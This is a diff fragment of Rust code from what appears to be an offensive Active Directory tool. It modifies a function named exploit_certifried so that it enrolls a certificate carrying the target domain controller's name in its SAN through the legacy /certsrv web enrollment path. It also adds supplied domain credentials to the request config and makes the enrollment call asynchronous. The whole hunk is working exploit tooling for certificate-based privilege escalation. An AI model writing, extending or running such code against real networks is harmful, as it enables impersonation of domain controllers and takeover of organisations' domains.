@@ -210,7 +210,9 @@ pub async fn exploit_certifried(
 
     let cert_config = CertighostConfig {
         ca_server: config.ca_url.clone(),
-        ces_url: format!("https://{}/certsrv/certfnsh.asp", config.ca_url),
+        // Certifried targets legacy web enrollment; leave the CES endpoint empty
+        // so the /certsrv path is used directly instead of a CES attempt first.
+        ces_url: String::new(),
         use_proxy: false,
         proxy_url: None,
         template: config.template.clone(),
@@ -218,9 +220,13 @@ pub async fn exploit_certifried(
         san: Some(config.target_dc_fqdn.clone()),
         key_size: 2048,
         dry_run: false,
+        domain: config.domain.clone(),
+        username: config.username.clone(),
+        password: config.password.clone(),
+        timeout_secs: 60,
     };
 
-    let cert_result = match certighost_auto_enroll(&cert_config) {
+    let cert_result = match certighost_auto_enroll(&cert_config).await {
         Ok(r) => r,
         Err(e) => {
             if config.cleanup {
